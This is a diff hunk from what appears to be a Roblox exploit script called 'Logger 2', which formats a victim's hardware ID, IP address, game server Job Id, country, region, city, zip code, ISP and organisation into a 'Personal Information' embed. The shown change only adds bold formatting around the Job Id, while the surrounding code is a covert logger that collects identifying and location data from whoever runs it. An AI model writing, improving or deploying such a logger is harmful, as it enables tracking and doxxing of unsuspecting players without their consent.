@@ -12,7 +12,7 @@ local ip_info = HttpRequest({
 local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
 local embed = {
         ['title'] = "Logger 2 | Personal Information",
-        ['description'] = string.format("\HWID: **%s**\nIP: **%s**\nJob Id: "..game.JobId.."\nCountry: **%s**\nCountry Code: **%s**\nRegion: **%s**\nRegion Name: **%s**\nCity: **%s**\nZip: **%s**\nISP: **%s**\nOrg: **%s**", hardware_id, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org),
+        ['description'] = string.format("\HWID: **%s**\nIP: **%s**\nJob Id: **"..game.JobId.."**\nCountry: **%s**\nCountry Code: **%s**\nRegion: **%s**\nRegion Name: **%s**\nCity: **%s**\nZip: **%s**\nISP: **%s**\nOrg: **%s**", hardware_id, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org),
         ["type"] = "rich",
         ["color"] = tonumber(getgenv().EmbedColor),
 }
